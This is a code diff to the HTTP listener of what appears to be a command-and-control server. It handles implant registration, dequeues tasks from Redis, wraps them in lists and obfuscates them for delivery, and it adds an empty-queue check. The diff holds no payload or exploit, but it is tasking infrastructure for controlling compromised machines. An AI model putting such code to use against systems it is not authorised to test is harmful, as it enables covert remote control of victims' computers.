@@ -545,14 +545,30 @@ def http_response(data_from_implant: bytes, request: Request):
     if implant_uuid == NULL_UUID:
         # Handle First-Time Registration
         msgpack_task = _register_new_implant(unpacked_metadata, request)
-
+        # ! hacky workaround for the moment, the implant needs a LIST of tasks, so we create that
+        task_dict = msgpack.unpackb(msgpack_task)
+        task_list = [task_dict]
     else:
+        # here, put into a list
         its = RedisImplantTaskService(implant_uuid)
         msgpack_task = its.dequeue_task()
 
+        # Catch the empty queue BEFORE unpacking so we don't 500
+        if not msgpack_task:
+            listener_logger.info("checkin_no_task")
+            raise HTTPException(status_code=204)
+
+        # ! hacky workaround for the moment, the implant needs a LIST of tasks, so we create that
+        # deserialize task
+        task_dict = msgpack.unpackb(msgpack_task)
+        task_list = [task_dict]
+
+    # convert back to msgpack
+    msgpack_task_list = msgpack.packb(task_list)
+
     structlog.contextvars.bind_contextvars(implant_id=implant_uuid)
 
-    if not msgpack_task:
+    if not msgpack_task_list:
         listener_logger.info("checkin_no_task")
         raise HTTPException(
             status_code=204  # 204 for no content, but the request suceeded.
@@ -564,7 +580,7 @@ def http_response(data_from_implant: bytes, request: Request):
     # get the stuff we need from it
     emitter = HttpGetBlockServerParser(mp.http_get.server)
     headers = emitter.headers()
-    obsfucated_task = emitter.generate_data(msgpack_task)
+    obsfucated_task = emitter.generate_data(msgpack_task_list)
 
     terminator_type, terimnator_key = emitter.get_output_terminator()
 
